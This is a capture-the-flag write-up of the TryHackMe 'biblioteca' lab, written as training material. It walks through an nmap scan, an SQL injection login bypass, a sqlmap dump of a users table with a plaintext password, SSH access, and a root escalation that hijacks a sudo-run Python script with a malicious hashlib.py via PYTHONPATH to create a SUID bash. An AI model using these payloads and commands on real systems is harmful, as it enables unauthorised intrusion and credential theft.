# TryHackMe biblioteca Writeup

* Link https://tryhackme.com/room/biblioteca
* IP 10.10.222.150

## Enumeration

### Portscan - nmap

Initial scan of the machine 

```
$ nmap -sC -sV -oA nmap/initial 10.10.222.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 09:29 EDT
Nmap scan report for 10.10.222.150
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
|_  256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds
```

### Web - Port 8000

Visiting the server on port 8000 reveals a web site

[login](./screenshots/login.png)

One thing to test for is sql Authentication bypass via SQLI and this works for username so  using the below for both username and password reveals a user called smokey


```
' or 1=1--
```
[smokeylogin](./screenshots/smokeylogin.png)

So after knowing the site is vulnabke to SQLI next thing is firing up sqlmap to what info could be dumped so saving the login in request from burp to disk it can be used to find interresting tables

```
$ sqlmap -r login.req --tables 
```

which shows a specific interresting table

```
Database: website                            
[1 table]                                
+---------------------------------------+                                                  
| users                                 |
+---------------------------------------+
```

dumping that table returns an the username and password

```
$ sqlmap -r login.req -D website -T users --dump
```

The result

```
Database: website
Table: users
[2 entries]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+
```

## User Access


The found password and username can be used to ssh into the machine as smokey.

After spending sometime the hint in the room was a bit helpful trying to change user to hazel
using the password hazel. 
With that the user.txt can be read.

## Privilege escalation 

Checking if Hazel can run sudo reveals

```
hazel@biblioteca:~$ sudo -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```
and the hasher.py

```
hazel@biblioteca:~$ cat hasher.py 
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()

```

So with that the python librart hashlib.py can be overwriten or more precise a malcious hashlib.py can created running custom code.

So the crafted malicious hashlib.py is stored in /tmp folder. IT will copy bash and set a suid bit.

```
import os

os.system("cp /bin/bash /tmp/bash")
os.system("chmod +s /tmp/bash") 
```

now the evil python library can used with the sudo command 

```
$ sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

after running the command a bash is created in tmp folder with suid bit set 

```
hazel@biblioteca:/tmp$ ls -la
total 1208
drwxrwxrwt 12 root  root     4096 Jun  6 14:11 .
drwxr-xr-x 19 root  root     4096 Dec  7 00:18 ..
-rwsr-sr-x  1 root  root  1183448 Jun  6 14:10 bash
drwxrwxrwt  2 root  root     4096 Jun  6 13:27 .font-unix
-rwxrwxr-x  1 hazel hazel      81 Jun  6 14:11 hashlib.py
drwxrwxrwt  2 root  root     4096 Jun  6 13:27 .ICE-unix
drwxr-xr-x  2 root  root     4096 Jun  6 14:10 __pycache__
drwx------  3 root  root     4096 Jun  6 13:28 snap.lxd
```

now getting root is as simple as

```
hazel@biblioteca:/tmp$ ./bash -p
bash-5.0# whoami
root
bash-5.0# 
```

Thats all on this machine a great machine.